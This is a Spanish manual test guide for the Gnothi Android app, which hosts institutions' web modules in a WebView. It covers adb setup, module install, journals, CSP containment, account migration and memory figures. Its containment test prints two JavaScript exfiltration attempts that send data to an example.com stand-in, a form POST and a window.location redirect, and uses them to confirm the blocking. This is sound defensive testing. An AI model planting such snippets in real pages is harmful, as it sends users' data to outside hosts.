# Probar los módulos web hospedados, en un Android cualquiera

**Qué prueba esto:** que la app que una institución publicó para el navegador —la misma, sin
recompilar— corre **dentro de Gnothi**, escribe su journal en los archivos de Gnothi, y que
llega ahí como llega de verdad: alguien toca un botón en la página de la institución.

Sirve igual en un **emulador** y en un **teléfono físico de cualquier marca y modelo**. Lo
único que hace falta a mano es que el aparato esté levantado o conectado antes de empezar.

**Cubre los cuatro módulos del POC**, cada uno con su institución, su publicador y su bundle:

| módulo | institución | publicador | página y app suelta | consultas |
|---|---|---|---|---|
| `examenes` | Laboratorio Clínico Delfos | `:8095` | `:8096` | `resumen`, `lista_de_examenes` |
| `compras` | Supermercado La Guaria | `:8101` | `:8102` | `resumen`, `lista_de_compras` |
| `cargas` | Estación de servicio | `:8111` | `:8112` | `resumen`, `lista_de_vehiculos` |
| `dealership` | DealershipCar (en inglés) | `:8092` | `:8093` | `resumen`, `hasta_donde_leyo` |

> **Lo que los tres nuevos todavía no tienen: el traspaso.** Ojo con no confundirlo con la
> **marca de migración** (P8), que sí tienen los cuatro. Son dos cosas:
>
> | | qué es | estado |
> |---|---|---|
> | **marca de migración** | el publicador dice "esta cuenta ya se mudó" y la app suelta pasa a solo lectura | ✅ los cuatro |
> | **traspaso** | las aserciones que ingresó LA PERSONA viajan de la app suelta a Gnothi | solo Exámenes |
>
> El traspaso quedó aparte a propósito: cuáles aserciones viajan es una decisión de diseño **por
> institución** —Cargas tiene la confirmación de tanque y las lecturas de odómetro,
> DealershipCar los aplazamientos y el perfil de uso declarado—.

**Corrido de punta a punta el 2026-09-04** sobre un emulador `sdk_gphone64_x86_64`
(Android 16 / SDK 36):

| | examenes | compras | cargas | dealership |
|---|:-:|:-:|:-:|:-:|
| P1 app suelta | ✅ | ✅ | ✅ | ✅ |
| P2 alta | ✅ | ✅ | ✅ | ✅ |
| P3 hospedado | ✅ | ✅ | ✅ | ✅ |
| P4 cartero | ✅ | ✅ | ✅ | ✅ |
| P5 journal | ✅ | ✅ | ✅ | ✅ |
| P7 consultas | ✅ | ✅ | ✅ | ✅ |
| P1b PWA como ícono | — | — | — | ✅ |
| P8 migración | ✅ | ✅ | ✅ | ✅ |

P6 y P9 vienen del 2026-09-03 sobre un **Xiaomi 14T Pro** físico; ver su nota. P1b se corrió en
DealershipCar y vale para los cuatro: el mecanismo es del navegador, no del módulo.

**Dos precisiones sobre esa tabla**, para que nadie la lea de más:

- **P2 con la pantalla de consentimiento** (§10.4 de `respuesta/13`) se corrió en **Compras**.
  Los otros tres se dieron de alta antes de que existiera, con el flujo viejo. El
  consentimiento es de Gnothi y no del módulo —el mismo código para los cuatro—, pero **su
  pantalla solo está verificada en Compras**.
- Las capturas de todo lo verificado están en `capturas/`. Sirven para comparar contra lo que
  te salga a vos.

---

## 1 · Lo único que tenés que hacer a mano

**Emulador:**

```bash
cd Gnothi.Mobile; .\demo-emulador.ps1
```

**Teléfono físico:** conectado por USB, con **Depuración USB** encendida (Ajustes → Acerca del
teléfono → tocá *Número de compilación* siete veces → Opciones de desarrollador → Depuración
por USB) y el diálogo de autorización **aceptado en su pantalla**. En Xiaomi/HyperOS hace falta
además **«Instalar vía USB»**, que es otro interruptor en la misma pantalla.

```bash
adb devices
```

Tiene que decir `device`. `unauthorized` = el diálogo espera en la pantalla del teléfono.
`offline` = desconectá y volvé a conectar.

Si nunca compilaste este proyecto acá, hacé antes los pasos 1 y 2 del [README](README.md) —el
workload de Android y el JDK—; son una sola vez.

---

## 2 · Un comando levanta el mundo

```bash
cd Gnothi.Mobile; .\escenario-webview.ps1
```

Por cada uno de los cuatro módulos hace lo mismo, y al final una vez lo del aparato:

| | qué | por qué |
|---|---|---|
| 1 | publica el módulo y arma su **bundle** (`manifest.json` + `web/`) | es lo que la institución publica |
| 2 | levanta su **publicador** | la narrativa de esa institución |
| 3 | levanta su **institución** | su página, su app suelta en `/app/`, y el relevo de eventos |
| 4 | tiende `adb reverse` de los ocho puertos | |
| 5 | instala Gnothi y **aprueba el dominio** `go.gnothi.app` | sin eso el botón de la página no abre la app |

Para uno solo: `.\escenario-webview.ps1 -Modulos compras`

Tres cosas de acá son las que se rompen, y ninguna avisa:

**`adb reverse` es lo que hace que emulador y físico se prueben igual.** Gnothi solo admite
tráfico en claro contra `127.0.0.1` y `localhost`
([network_security_config.xml](Resources/xml/network_security_config.xml)). Contra la IP de la
LAN o contra el `10.0.2.2` del emulador, el cartero muere con `Connection failure` y el módulo
se abre vacío **sin que nada diga por qué**.

**La app suelta y la página son el mismo servidor, a propósito.** La app se publica con
`<base href="/app/">` y pide sus eventos en una URL **relativa a su propio origen**. Servida
sola en otro puerto no arranca: da *«Ocurrió un error inesperado»*. Vive bajo el origen de su
institución, que es como funciona de verdad.

**El dominio hay que aprobarlo.** Chrome solo le entrega un enlace `https` a una app cuando esa
app es un handler **verificado** del dominio, y verificar `go.gnothi.app` de verdad exige servir
un `assetlinks.json` con la huella de firma. Sin la aprobación, tocar «Agregar a Gnothi» muestra
`DNS_PROBE_FINISHED_NXDOMAIN` y no pasa nada más.

Dejá una segunda terminal mirando por dentro. **Son tres tags y dicen cosas distintas:**

```bash
adb logcat -s GNOTHI:I gnothi:I modulo:I
```

- `GNOTHI` (mayúscula) — el Host: catálogo, consentimiento, comprobaciones.
- `gnothi` (minúscula) — el alta y el cartero. **Es fácil perdérselo**: casi todo lo interesante
  de estas pruebas sale acá.
- `modulo` — la consola de los módulos, incluidas las violaciones de CSP. **El nombre del
  módulo va al principio del mensaje**, no en el tag: `examenes: …`, `compras: …`. Para ver uno
  solo, `adb logcat -s modulo:I | grep '^.*examenes:'`.

> **Por qué un solo tag y no uno por módulo.** Este filtro antes decía
> `modulo:examenes:I modulo:compras:I …` y **no podía funcionar**: `-s` lee cada término como
> `TAG:PRIORIDAD`, así que `modulo:examenes:I` se interpreta como tag `modulo` con prioridad
> `examenes`. Un término inválido hace que logcat rechace **toda** la lista, no sólo ese, así
> que no salía ni `GNOTHI` y la app parecía muda. Un tag con dos puntos no se puede expresar en
> `-s`, y por eso el nombre del módulo se mudó al mensaje.

---

## 3 · Las pruebas

**Corrélas en orden, y por módulo.** P1 tiene que ir **antes** de P2 del mismo módulo: en cuanto
Gnothi consigue su credencial, el publicador marca esa cuenta como migrada y su app suelta pasa a
solo lectura. Si querés repetir P1, reiniciá su publicador —el estado es en memoria—.

Cada prueba trae **su comando y lo que se tiene que ver, por módulo**. No hay que traducir nada.

### P1 · La app suelta corre, y consigue su credencial sola

```bash
adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:<puerto>/app/
```

| módulo | puerto | qué se tiene que ver |
|---|---|---|
| `examenes` | 8096 | «Laboratorio Clínico Delfos» · *5 de tus 6 valores están en su rango* · **35 exámenes** · leído hasta el evento **234** |
| `compras` | 8102 | «Supermercado La Guaria» · **87 compras** tuyas desde enero de 2025 · **₡3.222.336** |
| `cargas` | 8112 | «Estaciones Faro» · **9 cargas** desde dic 2025 · 0 de 9 con kilometraje · leído hasta el evento **219** |
| `dealership` | 8093 | «Sotavento Motors» · VIN 1HGCM82633A004352 · **3 due · 2 overdue · 2 missed** · read up to event **118** |

**Primero hay que elegir dónde guarda.** Las cuatro abren preguntándolo, y hay que tocar la
opción del navegador:

| módulo | el botón dice |
|---|---|
| `examenes`, `cargas` | **Guardar acá** |
| `compras` | **Guardar acá** |
| `dealership` | **SAVE IN THIS BROWSER** |

**Y después no todas se comportan igual:** Compras, Cargas y DealershipCar **se ponen al día
solas** al elegir el destino. Exámenes necesita que además toques **Actualizar**. No es un bug de
ninguna: cada institución decidió cuándo pedirle a su proveedor.

**Qué prueba:** que la app pidió una credencial y leyó su narrativa. El publicador rechaza con
401 toda lectura sin token, así que **si hay datos en pantalla, hubo credencial** — y esa
credencial ya no está en el journal: está en el `localStorage` del origen.

**Mal:** *«Ocurrió un error inesperado»* ⇒ la app no se está sirviendo bajo `/app/`.
`415 Unsupported Media Type` ⇒ el relevo de eventos perdió el `Content-Type` del POST.


### P1b · La app suelta se instala como ícono en el aparato

Es como una persona la usa de verdad: no tecleando una URL, sino tocando un ícono. Y cambia lo
que se ve —sin barra de direcciones— así que conviene probarlo antes de mirar P8.

Con la app suelta abierta, menú de Chrome (⋮) → **Add to Home screen**. Chrome ofrece **dos
cosas distintas y solo una es la PWA**:

| opción | qué hace | cómo se ve al abrir |
|---|---|---|
| **Install** | acuña un **WebAPK** de verdad: la app queda en el cajón de aplicaciones | pantalla completa, **sin barra de direcciones** (`display: standalone` del manifiesto) |
| **Create shortcut** | un acceso directo | **se abre en Chrome**, con su barra |

**Qué tenés que ver:** el ícono y el nombre **de la institución**, no de Chrome. Medido: el
diálogo dice *«La Guaria y vos · Supermercado La Guaria»* con la orquídea morada.

> **«Install» EXIGE una cuenta de Google iniciada en el aparato, y sin ella falla en silencio.**
> Acuñar el WebAPK lo hace Play Services. En un emulador recién creado no hay cuenta, el ícono
> nunca aparece, y lo único que queda es esto en el logcat:
>
> ```
> Finsky : WebAPK InstallAPI usage: callingPackage=com.android.chrome
> Finsky : WebAPK service unknown_account.
> ```
>
> **Las dos cosas medidas el 2026-09-04**, en el mismo emulador: sin cuenta falla así; con una
> cuenta agregada, el WebAPK se acuña —`package:org.chromium.webapk.a6e7ae3363f7e1bc0_v2`— y la
> app abre **a pantalla completa, sin barra de direcciones**, con el color de la institución en
> la barra de estado y su estado intacto.
>
> Si no querés agregar cuenta al emulador, usá **Create shortcut**, sabiendo que abre en Chrome
> y no en modo standalone.

Para comprobar que se acuñó de verdad, y para abrirla sin buscar el ícono:

```bash
adb shell pm list packages | grep webapk
adb shell monkey -p org.chromium.webapk.<el que salga> -c android.intent.category.LAUNCHER 1
```

Los cuatro manifiestos ya están listos para esto —`display: standalone`, `start_url: "./"`,
`scope: "./"` e íconos propios—; no hay nada que configurar.

### P2 · El alta desde la página de la institución

```bash
adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:<puerto>/
```

Tocá **«Agregar a Gnothi»**. Los puertos son los mismos de P1: 8096, 8102, 8112, 8093.



**Qué tenés que ver EN LA PANTALLA**, que es lo que quien prueba puede juzgar sin leer un log.
El alta son **dos actos, y la persona decide en el medio**:

**1 · Gnothi baja el bundle** — franja arriba de tus módulos: ⟳ *Bajando el módulo de
127.0.0.1…* → *Revisando qué trae…*, con la lista todavía en «0 de 0».
`capturas/p2-alta-trabajando.png`

**2 · Gnothi te muestra lo que la institución propone** y espera
(`capturas/p2-alta-propuesta.png`). **Todavía no hay nada instalado.** La hoja dice:

| | de dónde sale |
|---|---|
| *Agregar Mis compras* · Supermercado La Guaria | lo que el manifiesto **declara** de sí mismo |
| **Qué va a poder contestar** — las consultas con su descripción | las `tools` del manifiesto |
| **Dónde va a vivir tu registro** — `/data/user/0/…/files/journals/compras` | lo decide **Gnothi** |
| **Con quién va a hablar** — `http://127.0.0.1:8101/cliente/1` | lo declara la institución, lo **fija** Gnothi |
| *El bundle lo sirvió 127.0.0.1* | de dónde se bajó de verdad |

**3 · La persona decide.**

- **«Ahora no»** ⇒ no queda **nada**. Comprobalo: `ls files/Modulos` y `ls files/journals` tienen
  que dar *No such file or directory*, y el log `alta: '<módulo>' descartado por la persona`.
- **«Instalar en mi teléfono»** ⇒ recién ahí aparece la tarjeta, y sigue todo lo demás (P4, P7).

**Por qué está partido así:** instalar un módulo es el acto más grande que la persona hace en
Gnothi —le da a una institución una carpeta suya y un endpoint registrado— y hasta el 2026-09-04
pasaba **solo**, como efecto de tocar un enlace. Para que el asistente vea una consulta hay un
interruptor por tool; para que existiera el módulo entero no había nada.

**Si falla** (probalo apuntando a un zip que no existe):

```bash
adb shell am start -a android.intent.action.VIEW -d "https://go.gnothi.app/alta?bundle=http%3A%2F%2F127.0.0.1%3A8102%2Fno-existe.zip"
```

Tiene que aparecer **en la pantalla** —*La dirección que dio tu institución ya no tiene el
módulo. Pedile el enlace otra vez.*— y **quedarse** ahí (`capturas/p2-alta-error.png`). Hasta el
2026-09-04 el fallo solo se escribía en logcat: la persona volvía a Gnothi y no pasaba nada.

**Funciona con Gnothi cerrado y con Gnothi ya abierto**, que son dos caminos distintos por
dentro (`OnCreate` y `OnNewIntent`) y los dos están probados.

**Qué tenés que ver en el logcat** (fijate en los dos tags — el del alta es el de minúscula):

```
gnothi : alta: bajando el bundle de 127.0.0.1
gnothi : alta: '<módulo>' instalado en /data/user/0/com.ncubo.gnothi.host/files/Modulos/<módulo>
GNOTHI : alta: '<módulo>' quedó instalado; N módulos
```

Y Gnothi abierto, con la tarjeta del módulo. Con los cuatro dados de alta, la pantalla de inicio
dice **«3 de 3 encendidos»** (o 4 de 4) y muestra una tarjeta por institución.

**Qué prueba:** que un módulo llega por donde llega de verdad. Hasta ahora solo entraban
empujando archivos con `adb`, que no es un camino que exista para nadie.

**Mal:** `DNS_PROBE_FINISHED_NXDOMAIN` ⇒ el dominio no quedó aprobado. Comprobalo:

```bash
adb shell pm get-app-links com.ncubo.gnothi.host
```

Tiene que decir `go.gnothi.app: approved`. Si dice `none`, corré:

```bash
adb shell pm set-app-links --package com.ncubo.gnothi.host 2 go.gnothi.app
```

### P3 · El módulo corre hospedado, a pantalla completa

Tocá la tarjeta del módulo, y después **«Abrir \<módulo\>»** — la fila que dice *la app de tu
institución, adentro de Gnothi*.

**Qué tenés que ver:** la UI **de la institución**, ocupando la pantalla entera, **sin barra de
direcciones ni nada del navegador**. No es una tarjeta de Gnothi con datos adentro: es su app.

Y arriba, el aviso que solo aparece hospedado:

| módulo | el aviso dice |
|---|---|
| `examenes` | *Se está guardando en Gnothi.* Tu expediente vive en el dispositivo, en la carpeta que Gnothi le dio a este laboratorio… |
| `compras` | *Se está guardando en Gnothi.* Tu registro vive en el dispositivo, en la carpeta que Gnothi le dio a este supermercado… |
| `cargas` | *Se está guardando en Gnothi.* Tu bitácora vive en el dispositivo, en la carpeta que Gnothi le dio a esta estación… |
| `dealership` | *It is being saved in Gnothi.* Your record lives on this device, in the folder Gnothi gave this dealership… |

**Los números tienen que ser los mismos que en P1.** Es el mismo binario leyendo su propio
journal; lo único que cambió es dónde vive.

**Y lo que NO tiene que aparecer:** el selector de «elegí dónde guardar». Hospedado no hay nada
que elegir ni permiso que pedir — el destino es de Gnothi. Si aparece, el módulo no se enteró de
que está hospedado.

**En el logcat:** `gnothi : <módulo>: el bundle declara su base en /app/`

**Mal:** pantalla blanca ⇒ casi siempre el `base href`. El módulo se sirve en la raíz de su host
virtual; si el publish quedó con otra base, todo da 404 y no se ve nada.

### P4 · Gnothi tiene su propia credencial, y releva el pull

**En el logcat, apenas se da de alta el módulo:**

```
gnothi : <módulo>: Gnothi consiguió su credencial ante el publicador
gnothi : <módulo>: pull after=0 -> NNNN bytes
```

Lo medido el 2026-09-04, y da idea de cuánto trae cada narrativa:

| módulo | el primer pull |
|---|---|
| `examenes` | `pull after=0 -> 6673 bytes` |
| `compras` | `pull after=0 -> 72928 bytes` |
| `cargas` | `pull after=0 -> 3985 bytes` |
| `dealership` | `pull after=0 -> 7825 bytes` |

**Qué prueba:** el módulo pidió, **Gnothi habló**. El cursor (`after=0`) lo puso el actor del
módulo, sacado de su propio journal; la credencial y el endpoint los puso Gnothi. Son dos
autoridades distintas y ninguna sabe lo de la otra.

Cerrá y volvé a abrir el módulo: el `after` tiene que ser **el número del último evento**, no
cero. Si vuelve a cero, el cursor no está saliendo del journal. Medido en Compras:
`pull after=387 -> 24 bytes` en la segunda vuelta — el cursor avanzó y no vino nada nuevo.

### P5 · El journal vive en los archivos de Gnothi, y no tiene credencial adentro

```bash
adb shell run-as com.ncubo.gnothi.host ls -lR files/journals
```

**Qué tenés que ver:** `files/journals/examenes/examenes/journal/journal_000001.bin` y su
`meta.bin`. El nombre va dos veces: la carpeta del módulo y adentro la del actor. **Y la
segunda no siempre se llama igual que la primera**: es el nombre del ACTOR, que lo elige el
módulo. Medido en los cuatro:

```
files/journals/examenes/examenes/journal/journal_000001.bin
files/journals/compras/compras/journal/journal_000001.bin
files/journals/cargas/cargas/journal/journal_000001.bin
files/journals/dealership/maintenance-1HGCM82633A004352/journal/journal_000001.bin
```

DealershipCar nombra su actor por el VIN: un journal por vehículo. Si vas a correr los
comandos de abajo para otro módulo, sacá la ruta de este `ls` y no la inventes.

Que ahí no hay credencial —**tiene que dar 0**—:

```bash
adb shell "run-as com.ncubo.gnothi.host grep -c -e at_ -e rt_ -e device- files/journals/examenes/examenes/journal/journal_000001.bin"
```

Control de que la búsqueda vale, porque el archivo es texto legible —**tiene que dar más de 0**—:

```bash
adb shell "run-as com.ncubo.gnothi.host grep -c -e bitacora files/journals/examenes/examenes/journal/journal_000001.bin"
```

**Qué prueba:** el registro **no está** en el almacenamiento del motor web. Está en el contenedor
de Gnothi, se lee desde afuera del WebView, sobrevive a que la persona borre los datos del sitio,
y no lleva ningún token adentro.

**Medido el 2026-09-04 en los cuatro:** cero coincidencias de credencial, y el control legible
dando 6, 2, 4 y 6 respectivamente. Los cuatro journals limpios.

### P6 · Contención: el módulo no puede salir a la red, y Gnothi sí

Es la prueba que vuelve **falsable** todo lo anterior: en la **misma corrida** el módulo intenta
alcanzar al publicador y el motor se lo niega, mientras Gnothi lo alcanza sin problema.

> **La mitad SÍ se ejecuta sola, y esto es una corrección: antes acá decía que nada se negaba
> espontáneamente.** Se negaba. El PWA de Blazor intenta registrar su service worker en cada
> carga, y la política se lo deniega sin que nadie toque nada. Medido el **2026-09-07** apenas
> instalar `examenes`, con `adb logcat -s modulo:I`:
>
> ```
> examenes: Creating a worker from 'https://examenes.gnothi.local/app/service-worker.js'
> violates the following Content Security Policy directive: "worker-src 'none'". The
> action has been blocked. (35)
> examenes: Uncaught (in promise) SecurityError: Failed to register a ServiceWorker
> ```
>
> Eso prueba, **con cero preparación**, que la política llega al módulo y que el motor la
> aplica. Y la denegación es benigna: en la misma corrida `resumen` contestó 122 bytes con
> `examenes: 11`, así que el módulo funciona igual sin su service worker.
>
> **Lo que todavía pide la sonda** es la otra mitad: que no pueda alcanzar al *publicador*. Eso
> es `connect-src 'self'`, y ahí sí el módulo hospedado nunca lo intenta —usa el puente—, así
> que no hay nada que negar. Se midió el **2026-09-03** agregando una sonda temporal que hacía
> `fetch` contra el publicador: el módulo denegado por CSP y Gnothi respondiendo, en la misma
> corrida. Para repetir esa mitad hay que volver a poner la sonda.

Lo que **sí** se puede mirar ahora es la política que se le sirve, en `BundleServer`
([../Gnothi.Movil/BundleServer.cs](../Gnothi.Movil/BundleServer.cs)): `connect-src 'self'`, con
el hash del script inline calculado al servir. Si ahí dijera `*`, no habría contención.

Y ahora vive en `Gnothi.Movil`, o sea que **es literalmente la misma cadena que sirve iOS**,
calculada por el mismo código. Antes era `ServidorDelBundle` en `ModulosWeb.cs`, de este
proyecto.

Cuando la sonda está puesta, la violación aparece bajo el tag `modulo`, con el nombre del
módulo al principio del mensaje:

```
examenes: Refused to connect to 'http://127.0.0.1:8095/...' because it violates the
following Content Security Policy directive: "connect-src 'self'"
```

#### La denegación ya no es muda: Gnothi la cuenta

Desde el **2026-09-07** cada rechazo del motor le llega a Gnothi **como un hecho**, no como una
línea de consola entre otras. Gnothi inyecta un vigía en el documento que sirve —está en
`BundleServer`, así que Android e iOS lo tienen del mismo código— y ese vigía escucha
`securitypolicyviolation` y lo manda por el puente.

Se ve así, bajo el tag `gnothi` y **no** bajo `modulo`:

```
examenes: REFUSED by worker-src -- https://examenes.gnothi.local/app/service-worker.js
          (from https://examenes.gnothi.local/app/:35); 1 so far
```

Trae **la directiva, qué se bloqueó, de dónde salió y la cuenta**. Esa cuenta es lo que hace la
diferencia entre una política declarada y una que se sabe que está aplicando: un módulo cuya
cuenta nunca se mueve o se porta bien **o no lo está mirando nadie**, y hasta ahora no había
forma de distinguir esos dos casos.

**Qué mirar en cada corrida:** abrí cualquier módulo y tiene que aparecer al menos el
`worker-src` de arriba. **Si no aparece ninguno, algo se rompió** — probablemente el vigía no
está corriendo, y eso significa que tampoco te vas a enterar de los que importan.

> Esto **no** va al journal, a propósito: el journal es el registro de la persona tal como lo
> escribe la institución, y una violación de contención es de Gnothi. Meterla ahí sería poner la
> opinión del Host adentro del libro de la institución.

#### Las otras dos salidas, y cómo probarlas de verdad

`connect-src` cubre el `fetch`, pero **no es la única forma de sacar datos de una página**. Hay
dos más, y las dos estaban abiertas hasta el **2026-09-07**:

| salida | qué la gobierna | ¿hereda de `default-src`? |
|---|---|---|
| **`<form action="https://ajeno" method="post">`** | `form-action` | **no** — por eso faltaba |
| **`window.location = 'https://ajeno/?d=…'`** | **ninguna directiva existe** | — |

La primera se cerró con `form-action 'self'` en la cadena compartida; la segunda con
`ShouldOverrideUrlLoading` en `BundleServerClient`, que rechaza todo host que no sea el del
módulo y **lo loguea**.

**Y esta prueba SÍ se puede correr entera, sin sonda y sin tocar el módulo**, porque en Debug el
WebView es inspeccionable. Con el escenario arriba y un módulo abierto:

```bash
adb shell cat /proc/net/unix | grep -o 'webview_devtools_remote_[0-9]*' | sort -u
adb forward tcp:9222 localabstract:webview_devtools_remote_<pid>
```

Después, `chrome://inspect` en Chrome de escritorio muestra los dos WebViews —el módulo en
`https://<módulo>.gnothi.local/app/` y la cáscara en `file:///android_asset/ui.html`— y desde su
consola:

```javascript
// intento A · el formulario
var f = document.createElement('form');
f.method = 'POST'; f.action = 'https://example.com/collect';
document.body.appendChild(f); f.submit();

// intento B · la navegación
window.location = 'https://example.com/?d=lo-que-sea';
```

**Qué tenés que ver.** La página **no** se mueve de su propio origen, y en el log:

```
modulo : examenes: Sending form data to 'https://example.com/collect' violates the following
         Content Security Policy directive: "form-action 'self'". The request has been blocked.
gnothi : examenes: navigation refused to https://example.com -- outside its own origin
```

> **MEDIDO el 2026-09-07, antes y después.** Sin el arreglo los dos intentos **salían**: la
> página terminaba en `https://example.com/collect` y el servidor contestaba **405**, o sea que
> el POST llegó de verdad a la red. Y la navegación terminaba en
> `https://example.com/?d=datos-de-sonia`. No era un agujero teórico.

### P7 · Las consultas del módulo llegan al Host

Pasa sola al dar de alta: Gnothi comprueba el módulo apenas lo instala.

**En el logcat:**

```
GNOTHI : comprobación de examenes: {"module":"examenes","matches":true,
         "declared":["lista_de_examenes","resumen"],"actual":["lista_de_examenes","resumen"],...}
GNOTHI :   resumen contestó 122 bytes: {"hayDatos":true,"examenes":35,
           "analitosFueraDeRango":0,"ultimoEventoLeido":234}
```

**Qué prueba:** el puente en la otra dirección. El módulo publicó su superficie
(`window.gnothi.tools` / `call`) y Gnothi la alcanza. `matches:true` dice que lo que el
manifiesto **declara** y lo que el módulo **contesta** son la misma lista — una institución no
puede prometer una consulta y no tenerla, ni tener una que no declaró.

**Lo medido el 2026-09-04 en los otros tres**, todos con `matches:true`:

```
compras     {"hayDatos":true,"totalGastado":3222336,"cantidadDeCompras":87,"ultimoEventoLeido":387}
cargas      {"hayDatos":true,"cargas":9,"vehiculos":1,"ultimoEventoLeido":219}
dealership  {"hasData":true,"vin":"1HGCM82633A004352","anythingDue":true,"dueCount":3,"overdueCount":2,…}
```

DealershipCar contesta en inglés porque el módulo entero está en inglés. No es un descuido:
la respuesta es del módulo, y el módulo habla su idioma.

**Puede aparecer una vez** `{"ok":false,"motivo":"La app todavia no arranco."}` justo después
del alta, y despues la respuesta buena. Es la carrera conocida entre el dibujado y la
hidratación del actor: el módulo avisa con `listo()` y Gnothi reintenta. Si se queda ahí y no
se corrige, entonces sí es un problema.

También podés tocarlo a mano: en la tarjeta del módulo, **«Cómo vengo»** y **«Mis exámenes»**.

### P8 · La marca de migración llega por el sobre

Con el módulo ya dado de alta —o sea, con Gnothi ya con su credencial— volvé a la app suelta:

```bash
adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:<puerto>/app/
```

Elegí dónde guardar, y en Exámenes además tocá **Actualizar**.

**Qué tenés que ver:** el botón de refrescar queda **deshabilitado** y cambia de texto, y abajo
aparece el aviso. Los datos que ya tenía **siguen ahí**: "desaparecer" no es desinstalar ni
borrar — lo único que deja de hacer es sincronizar.

| módulo | el botón pasa a decir | el aviso |
|---|---|---|
| `examenes` | Ya no se actualiza | Tus exámenes nuevos ahora entran por Gnothi, en este mismo teléfono… |
| `compras` | Ya no se actualiza | Tus compras nuevas ahora entran por Gnothi… |
| `cargas` | Ya no se actualiza | Tus cargas nuevas ahora entran por Gnothi… |
| `dealership` | No longer updating | New maintenance facts now arrive through Gnothi, on this same phone… |

**Qué prueba:** que la marca de migración la pone **el publicador**, no el aparato. Ninguna marca
del lado web sobrevive a «borrar datos del sitio»; ésta viaja en el sobre de eventos y certifica
que Gnothi de verdad recibió una credencial.

**Mal:** si sigue en modo normal, el publicador no reconoció el device de Gnothi. Lo distingue
por el prefijo de su clave de device.

#### P8b · Y ahora el publicador REVOCA, no sólo avisa

Hasta el **2026-09-07** la app suelta dejaba de sincronizar porque **decidía** obedecer la marca;
el publicador no le quitaba nada. Con una app vieja o modificada seguía leyendo — y ahí sí hay
dos historias divergiendo, que es lo que la marca existe para evitar (`13 §4` paso 4).

Ahora la cuenta queda vinculada **con un plazo de gracia de 30 días**, que viaja en el mismo
sobre (`account.graceUntil`), y vencido ese plazo la cuenta **es de Gnothi**. Se prueba sin
esperar un mes, con curl contra el publicador:

```bash
curl -X POST http://127.0.0.1:8095/device/vencer-gracia
```

Y después, con el token que la app suelta ya tenía:

```
HTTP 401  {"error":"invalid_token","error_description":"la cuenta expediente/1 ya no se
           sirve a este cliente"}
```

**Las tres puertas, y hay que probar las tres.** Cerrar una sola sería teatro: **medido en el
cliente**, ante un 401 al leer rota la credencial, y si la rotación falla pide una concesión
nueva con su device key. Si `/device/token` quedara abierto, el acceso vuelve en dos saltos.

| puerta | qué se prueba | esperado |
|---|---|---|
| leer | `GET /{recurso}/1/events` con el token viejo | **401** `invalid_token` |
| rotar | `POST /device/refresh` con su refresh | **401** |
| pedir de nuevo | `POST /device/token` con su device key | **401** `invalid_token` |
| y Gnothi | `GET events` con el token de Gnothi | **200**, `state=migrated` |

**Y es reversible**, que es el paso 5 de `§4`:

```bash
curl -X DELETE http://127.0.0.1:8095/expediente/1/vinculo
```

La concesión de Gnothi se revoca, el vínculo se borra, y la app suelta vuelve a `active` en su
siguiente pedido. Una decisión de la que no se puede volver no es una decisión de la persona.

> **MEDIDO el 2026-09-07** contra los mocks de `examenes` y de `compras`, el ciclo entero: activa
> → vinculada con gracia → sigue leyendo → gracia vencida → las tres puertas en 401 → Gnothi lee
> → desvinculada → activa otra vez. Los cuatro publicadores tienen el mismo comportamiento.
>
> **Una app que obedece nunca llega al 401**: se entera por `account` y deja de pedir. El rechazo
> es para la que no obedece — y por eso es un rechazo y no un aviso.

### P9 · Las mediciones

```bash
adb shell dumpsys meminfo com.ncubo.gnothi.host
```

Buscá `TOTAL PSS`. Medido con el módulo abierto: **216–248 MB** en el Xiaomi 14T Pro,
**157–160 MB** en el emulador, y **199 MB** en el emulador con los cuatro módulos instalados
y uno vivo. Es un número alto y es el que sostiene la regla de desalojo: Gnothi no puede tener
muchos módulos vivos a la vez.

**Y hay una razón de fondo**, medida el 2026-09-04: cada módulo trae **su propio motor**. En el
bundle de Exámenes, `_framework/` pesa 20 MB sin comprimir e incluye `Puppeteer.wasm`,
`Choreography.wasm` y el runtime de .NET. Gnothi le da al módulo la red, los archivos y el
ciclo de vida — el sustrato no. Ver `respuesta/13` §10.2.

Arranque, del logcat: runtime wasm **1610/1067 ms** en el físico contra **2273/1593** en el
emulador; proceso a dibujado **1970 ms** contra **2938**. El bundle pesa **12,1 MB** en crudo.

---

## 4 · Si algo sale mal

Todo esto lo pisamos nosotros.

**El módulo se abre vacío y no hay error.** Casi siempre el túnel. `adb reverse --list` tiene que
mostrar los dos puertos. Un reverse viejo apuntando a un puerto muerto **no da error**:
simplemente no contesta, y se ve igual que «el servidor no arrancó». Por eso el script hace
`--remove-all` antes de tenderlos.

**`Connection failure` en el cartero.** El tráfico en claro está bloqueado desde API 28. Si la URL
del publicador no es `127.0.0.1` ni `localhost`, Android la corta. Mirá qué quedó en el manifiesto:

```bash
adb shell run-as com.ncubo.gnothi.host cat files/Modulos/examenes/manifest.json
```

**El bundle se instala pero el módulo no trae nada.** El manifiesto lleva la URL del publicador
**adentro**. Si armaste el bundle con un puerto y el túnel quedó en otro, instala bien y no trae
nada. Rearmalo:

```bash
.\armar-bundle.ps1 -Publicador http://127.0.0.1:8095/
```

**Las capturas de pantalla salen corruptas o en negro.** En PowerShell, `adb exec-out screencap -p > x.png`
**arruina el binario** —le mete BOM y reescribe los saltos de línea—. Usá dos pasos:

```bash
adb shell screencap -p /sdcard/x.png
adb pull /sdcard/x.png
```

Y si sale toda negra, el aparato se durmió: el script ya hace `adb shell svc power stayon true`.

**`adb push` corta con «failed to read copy response: EOF».** Pasa en el emulador contra
`/sdcard/Android/data/<paquete>/` con imágenes `google_apis_playstore`, por scoped storage. En
físico anda. El camino que sirve en los dos es `/data/local/tmp` y de ahí con `run-as`.

**`am start` no hace nada.** El nombre de la Activity lleva un hash que cambia en cada
recompilación. Resolvelo cada vez:

```bash
adb shell cmd package resolve-activity --brief com.ncubo.gnothi.host
```

**El publish falla con «being used by another process».** Claude Code o Claude Desktop tienen
tomados los dll de los servidores MCP, o hay un servidor del escenario corriendo. Bajá el
escenario primero.

**Empezar de cero:**

```bash
.\escenario-webview.ps1 -Detener
adb shell pm clear com.ncubo.gnothi.host
```

Ojo: `pm clear` borra los módulos instalados **y** los journals. Y el publicador guarda su estado
en memoria, así que reiniciarlo es lo que devuelve la cuenta a «no migrada».

---

## 5 · Lo que este guion NO puede probar

No es que falte hacerlo: **no se puede desde acá**, y conviene que esté dicho para que nadie lo dé
por verificado.

